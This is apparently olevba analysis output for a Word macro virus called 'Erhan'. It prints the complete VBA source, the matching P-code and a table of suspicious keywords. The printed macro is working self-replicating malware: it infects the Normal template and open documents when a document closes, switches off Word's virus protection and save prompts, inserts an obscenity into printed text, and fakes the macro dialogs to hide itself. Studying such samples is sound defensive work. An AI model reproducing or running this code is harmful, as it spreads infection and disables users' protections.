olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Erhan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Erhan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Fuck Off
'2000г. Брянск, БГТУ
Private Sub Document_Close()
  On Error Resume Next
  s = ActiveDocument.Saved
  Application.EnableCancelKey = Not -1
  
  With Options
    .ConfirmConversions = 0
    .VirusProtection = 0
    .SaveNormalPrompt = 0
  End With

  Arl = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  ReDim Ar(1 To Arl) As String
  For i = 1 To Arl
    Ar(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Next i
  
  If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Fuck Off" Then
     Set t = NormalTemplate.VBProject.VBComponents.Item(1)
     For i = 1 To Arl
       If (Left(Ar(i), 6) = "'Sub F") Or (Left(Ar(i), 6) = "'Sub T") Or (Left(Ar(i), 6) = "'Sub V") Then
         t.CodeModule.InsertLines i, Right(Ar(i), Len(Ar(i)) - 1)
       Else
         t.CodeModule.InsertLines i, Ar(i)
       End If
     Next i
  ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Fuck Off" Then
     Set t = ActiveDocument.VBProject.VBComponents.Item(1)
     For i = 1 To Arl
       If (Left(Ar(i), 5) = "Sub F") Or (Left(Ar(i), 5) = "Sub T") Or (Left(Ar(i), 5) = "Sub V") Then
         t.CodeModule.InsertLines i, "'" + Ar(i)
       Else
         t.CodeModule.InsertLines i, Ar(i)
       End If
     Next i
  Else
     t = ""
  End If
  
  If t <> "" Then
    If (Left(ActiveDocument.Name, 8) <> "Document") Or (Left(ActiveDocument.Name, 8) <> "Документ") Then
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
  End If
  
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub ToBlja(x, y)
    Application.EnableCancelKey = Not -1
    Set dlg1 = Dialogs(wdDialogEditReplace)
    With dlg1
       .Find = x
       .Replace = y
       .ReplaceAll = 1
       .Execute
    End With
End Sub
Sub FilePrintDefault()
    ToBlja ", ", ", бля "
    On Error GoTo ErHan
    ActiveDocument.PrintOut
    ToBlja ", бля ", ", "
    Exit Sub
ErHan:
    On Error GoTo 0
    ToBlja ", бля ", ", "
    Resume
End Sub
Sub FilePrint()
    ToBlja ", ", ", бля "
    On Error GoTo ErHan
    Dialogs(wdDialogFilePrint).Show
    ToBlja ", бля ", ", "
    Exit Sub
ErHan:
    On Error GoTo 0
    ToBlja ", бля ", ", "
    Resume
End Sub
Sub ToolsMacro()
  MsgBox "Макросов нет ни в одном открытом документе!", vbExclamation, "Ошибка"
End Sub
Sub ViewVBCode()
  ToolsMacro
End Sub
Sub ToolsOptions()
  With Options
    .ConfirmConversions = 1
    .VirusProtection = 1
    .SaveNormalPrompt = 1
  End With
  Dialogs(wdDialogToolsOptions).Show
  With Options
    .ConfirmConversions = 0
    .VirusProtection = 0
    .SaveNormalPrompt = 0
  End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Erhan
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5768 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0008 "Fuck Off"
' Line #1:
' 	QuoteRem 0x0000 0x0013 "2000г. Брянск, БГТУ"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #5:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' Line #7:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #8:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #9:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #10:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #11:
' 	EndWith 
' Line #12:
' Line #13:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Arl 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld Arl 
' 	RedimAs Ar 0x0001 (As String)
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Arl 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld i 
' 	ArgsSt Ar 0x0001 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'Fuck Off"
' 	Ne 
' 	IfBlock 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Arl 
' 	For 
' Line #22:
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Sub F"
' 	Eq 
' 	Paren 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Sub T"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0006 "'Sub V"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #23:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0009 "'Fuck Off"
' 	Ne 
' 	ElseIfBlock 
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Arl 
' 	For 
' Line #31:
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sub F"
' 	Eq 
' 	Paren 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sub T"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sub V"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #32:
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	Add 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	ElseBlock 
' Line #34:
' 	Ld i 
' 	Ld i 
' 	ArgsLd Ar 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	LitStr 0x0000 ""
' 	St t 
' Line #39:
' 	EndIfBlock 
' Line #40:
' Line #41:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Документ"
' 	Ne 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Private Sub ToBlja(x, y))
' Line #50:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #51:
' 	SetStmt 
' 	Ld wdDialogEditReplace 
' 	ArgsLd Dialogs 0x0001 
' 	Set dlg1 
' Line #52:
' 	StartWithExpr 
' 	Ld dlg1 
' 	With 
' Line #53:
' 	Ld x 
' 	MemStWith Find 
' Line #54:
' 	Ld y 
' 	MemStWith Replace 
' Line #55:
' 	LitDI2 0x0001 
' 	MemStWith ReplaceAll 
' Line #56:
' 	ArgsMemCallWith Execute 0x0000 
' Line #57:
' 	EndWith 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FilePrintDefault())
' Line #60:
' 	LitStr 0x0002 ", "
' 	LitStr 0x0006 ", бля "
' 	ArgsCall ToBlja 0x0002 
' Line #61:
' 	OnError ErHan 
' Line #62:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #63:
' 	LitStr 0x0006 ", бля "
' 	LitStr 0x0002 ", "
' 	ArgsCall ToBlja 0x0002 
' Line #64:
' 	ExitSub 
' Line #65:
' 	Label ErHan 
' Line #66:
' 	OnError (GoTo 0) 
' Line #67:
' 	LitStr 0x0006 ", бля "
' 	LitStr 0x0002 ", "
' 	ArgsCall ToBlja 0x0002 
' Line #68:
' 	Resume  
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub FilePrint())
' Line #71:
' 	LitStr 0x0002 ", "
' 	LitStr 0x0006 ", бля "
' 	ArgsCall ToBlja 0x0002 
' Line #72:
' 	OnError ErHan 
' Line #73:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	LitStr 0x0006 ", бля "
' 	LitStr 0x0002 ", "
' 	ArgsCall ToBlja 0x0002 
' Line #75:
' 	ExitSub 
' Line #76:
' 	Label ErHan 
' Line #77:
' 	OnError (GoTo 0) 
' Line #78:
' 	LitStr 0x0006 ", бля "
' 	LitStr 0x0002 ", "
' 	ArgsCall ToBlja 0x0002 
' Line #79:
' 	Resume  
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub ToolsMacro())
' Line #82:
' 	LitStr 0x002B "Макросов нет ни в одном открытом документе!"
' 	Ld vbExclamation 
' 	LitStr 0x0006 "Ошибка"
' 	ArgsCall MsgBox 0x0003 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub ViewVBCode())
' Line #85:
' 	ArgsCall ToolsMacro 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub ToolsOptions())
' Line #88:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #89:
' 	LitDI2 0x0001 
' 	MemStWith ConfirmConversions 
' Line #90:
' 	LitDI2 0x0001 
' 	MemStWith VirusProtection 
' Line #91:
' 	LitDI2 0x0001 
' 	MemStWith SaveNormalPrompt 
' Line #92:
' 	EndWith 
' Line #93:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #95:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #96:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #97:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #98:
' 	EndWith 
' Line #99:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

